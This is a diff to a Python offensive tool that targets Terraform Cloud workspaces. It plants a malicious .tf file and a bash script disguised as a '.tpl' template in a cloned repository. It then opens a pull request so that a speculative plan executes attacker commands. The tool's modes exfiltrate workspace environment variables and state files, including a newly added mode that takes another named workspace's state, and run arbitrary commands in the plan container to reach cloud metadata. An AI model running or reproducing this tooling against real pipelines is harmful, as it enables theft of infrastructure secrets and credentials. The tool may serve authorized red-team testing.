@@ -1,9 +1,10 @@
 ### Variable Info ###
-# the repo argument is the git repo of a TF workspace that is going to be cloned and targeted by these attacks
-# the folder argument is the name of the directory within the git repo that holds the .tf files
-# tmp folder is the parent directory where the targeted repository is being cloned to.
+# the "repo" argument is the git repo of a TF workspace that is going to be cloned and targeted by these attacks
+# the "folder" argument is the name of the directory within the git repo that holds the .tf files
+# "tmp folder" is the parent directory where the targeted repository is being cloned to.
 # So the full path looks something like:
 #       .../tmp/repo/folder 
+###
 
 import argparse
 import os
@@ -105,16 +106,16 @@ def apply_on_plan(tmp_folder, terraform_folder):
     print(f"[+] Copying template file from {src_file} to {dst_file}")
     shutil.copy(src_file, dst_file) 
     
-    s = Template(open(dst_file, "r").read())
-    # The command we will run is a bash script
-    template_filled = s.substitute(command="bash instance.tpl")
-    open(dst_file, "w").write(template_filled)
-
     # We add the "malicious tf file" with an AWS S3 bucket
     src_file = os.path.join(SCRIPT_PATH, "templates/s3_bucket.tf")
     dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance003")
     print(f"[+] Copying template file from {src_file} to {dst_file}")
     shutil.copy(src_file, dst_file) 
+
+    s = Template(open(dst_file, "r").read())
+    # The command we will run is a bash script
+    template_filled = s.substitute(command="bash instance.tpl")
+    open(dst_file, "w").write(template_filled)
 
     # We add the bash script that performs the apply
     # Pretend the malicious script is a .tpl file
@@ -134,20 +135,24 @@ def apply_on_plan(tmp_folder, terraform_folder):
     url_pr = re.search(f"http.*{TMP_BRANCH}", output).group(0)
     return url_pr
 
-def get_state_file(tmp_folder, terraform_folder):
+def get_state_file(tmp_folder, terraform_folder, workspace=None):
     # Copying template to execute a command
     src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
     # We use a name that is generic but unique
     dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance002.tf")
     print(f"[+] Copying template file from {src_file} to {dst_file}")
     shutil.copy(src_file, dst_file) 
-    
+
     s = Template(open(dst_file, "r").read())
     # The command we will run is a bash script
-    template_filled = s.substitute(command="bash instance.tpl")
+    if workspace != None:
+        command = f"bash instance.tpl {workspace}"
+        template_filled = s.substitute(command=command)
+    else:
+        template_filled = s.substitute(command="bash instance.tpl")
     open(dst_file, "w").write(template_filled)
 
-    # We add the bash script that performs the apply
+    # We add the bash script that performs the tf statefile exfil
     # Pretend the malicious script is a .tpl file
     src_file = os.path.join(SCRIPT_PATH, "templates/retrieve_state_file.sh")
     dst_file = os.path.join(tmp_folder, terraform_folder, "instance.tpl")
@@ -201,11 +206,12 @@ def parse_args():
     arg_parser = argparse.ArgumentParser()
     arg_parser.add_argument('--repo', type=str, help="Github repository (SSH url) that is going to be targeted", required=True)
     arg_parser.add_argument('--folder', type=str, help="Folder in the repo that contains the terraform files where you wish the attack to take place", required=True)
-    arg_parser.add_argument('--get_envs', action='store_true', help="It gets the environment variables from the TF workspaces")
-    arg_parser.add_argument('--get_state_file', action='store_true', help="It gets the state file just doing a plan, useful when the user doesn't have permissions to access the state file")
-    #arg_parser.add_argument('--get_all_state_files_from_org', type=str, help="Gets the ATLAS TOKEN used during a speculative run (plan), and abuse the implicit permissions to get the state files of all workspaces in the organization")
-    arg_parser.add_argument('--exec_command', type=str, help="Runs a command in the container used to run the speculative plan, useful to access TFC infra and access Cloud metadata if misconfigured")    
-    arg_parser.add_argument('--apply_on_plan', action='store_true', help="")    
+    attack = arg_parser.add_mutually_exclusive_group(required=True)
+    attack.add_argument('--get_envs', action='store_true', help="This retrieves the environment variables from a TF workspaces")
+    attack.add_argument('--get_state_file', action='store_true', help="This retrieves the state file of the current TF workspace through a TF plan; useful when the user doesn't have permissions to access the state file")
+    attack.add_argument('--get_state_file_from_workspace', type=str, help="This retrieves the state file of a supplied workspace name through a TF plan; useful when the user doesn't have permissions to access the state file")
+    attack.add_argument('--exec_command', type=str, help="Runs a command in the container used to run the speculative plan, useful to access TFC infra and access Cloud metadata if misconfigured")    
+    attack.add_argument('--apply_on_plan', action='store_true', help="")    
     return arg_parser.parse_args()
 
 def main():
@@ -228,7 +234,8 @@ def main():
         url_pr = apply_on_plan(tmp_folder, args.folder)
     elif args.get_state_file:
         url_pr = get_state_file(tmp_folder, args.folder)
-        
+    elif args.get_state_file_from_workspace:
+        url_pr = get_state_file(tmp_folder, args.folder, args.get_state_file_from_workspace)
     
     # Show to the user the URL to create a Github PR
     print("[!] Visit the following URL to complete the PR that will trigger the TF attack")
